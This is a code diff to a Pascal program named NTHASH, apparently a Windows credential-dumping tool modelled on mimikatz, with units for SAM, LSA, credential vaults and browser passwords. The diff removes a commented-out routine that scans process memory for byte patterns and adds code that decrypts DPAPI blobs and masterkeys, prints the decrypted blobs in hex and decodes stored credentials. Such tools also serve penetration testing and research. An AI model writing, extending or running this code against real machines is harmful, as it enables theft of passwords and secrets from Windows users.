@@ -7,9 +7,10 @@
 
 program NTHASH;
 
-uses windows, classes, sysutils, dos, usamlib, usid, uimagehlp, upsapi,uadvapi32,
-   untdll,utils,  umemory, ucryptoapi, usamutils, uofflinereg,
-  uvaults, uLSA, uchrome, ufirefox, urunelevatedsupport,wtsapi32, uwmi,base64;
+uses windows, classes, sysutils, dos, usamlib, usid, uimagehlp, upsapi,
+  uadvapi32, untdll, utils, umemory, ucryptoapi, usamutils, uofflinereg,
+  uvaults, uLSA, uchrome, ufirefox, urunelevatedsupport, wtsapi32, uwmi, base64,
+  udpapi;
 
 type _LUID =record
      LowPart:DWORD;
@@ -297,51 +298,7 @@ if param<>nil then
 end;
 
 
-//**********************************************************************
-{
-//https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl_m_lsadump.c#L971
-//pattern should be a parameter to make this function generic...
-function search(hprocess:thandle;addr:pointer;sizeofimage:DWORD):nativeint;
-const
-  //search pattern
-  WIN_X64:array[0..3] of byte=($49, $8d, $41, $20);
-  WIN_X86:array[0..4] of byte=($c6, $40, $22, $00, $8b);
 
-var
-  i:nativeint;
-  buffer,pattern:tbytes;
-  read:cardinal;
-begin
-result:=0;
-if LowerCase (osarch )='amd64' then
-   begin
-   setlength(buffer,4);
-   setlength(pattern,4);
-   CopyMemory (@pattern[0],@WIN_X64[0],length(pattern));
-   end
-   else
-   begin
-   setlength(buffer,5);
-   setlength(pattern,5);
-   CopyMemory (@pattern[0],@WIN_X86[0],length(pattern));
-   end;
-log('Searching...',0);
-  for i:=nativeint(addr) to nativeint(addr)+sizeofimage-length(buffer) do
-      begin
-      //fillchar(buffer,4,0);
-      if ReadProcessMemory( hprocess,pointer(i),@buffer[0],length(buffer),@read) then
-        begin
-        //log(inttohex(i,sizeof(pointer)));
-        if CompareMem (@pattern [0],@buffer[0],length(buffer)) then
-           begin
-           result:=i;
-           break;
-           end;
-        end;//if readprocessmemory...
-      end;//for
-log('Done!',0);
-end;
-}
 
 function Init_Int_User_Info:tbytes;
 const
@@ -1685,9 +1642,17 @@ p:=pos('/enumts',cmdline); //can be done with taskkill
            begin
            input_:=HexaStringToByte2(input);
            log('length(input_):'+inttostr(length(input_)));
+           log('**** Unprotecting Blob ****',1);
            if dpapi_unprotect_blob(@blob,input_ ,length(input_),nil,0,nil,ptr_,dw) then
              begin
              log('dpapi_unprotect_blob ok',1);
+             //SetLength(output_,dw);
+             //CopyMemory(@output_[0],ptr_,dw);
+             //log('Blob:'+ByteToHexaString (output_),1);
+             log('Blob:'+ByteToHexaString (ptr_,dw),1);
+             log('**** Decoding Cred Blob ****',1);
+             //decodecredblob(@output_[0]);
+             decodecredblob(ptr_);
              end
              else log('dpapi_unprotect_blob not ok',1);
            end;
@@ -1702,7 +1667,7 @@ p:=pos('/enumts',cmdline); //can be done with taskkill
            begin
            input_:=HexaStringToByte2(input);
            log('length(input_):'+inttostr(length(input_)));
-
+           log('**** Unprotecting MasterKey ****',1);
              ptr_:=nil;
              if dpapi_unprotect_masterkey_with_shaDerivedkey(mk,@input_[0],length(input_),ptr_,dw)
                 then
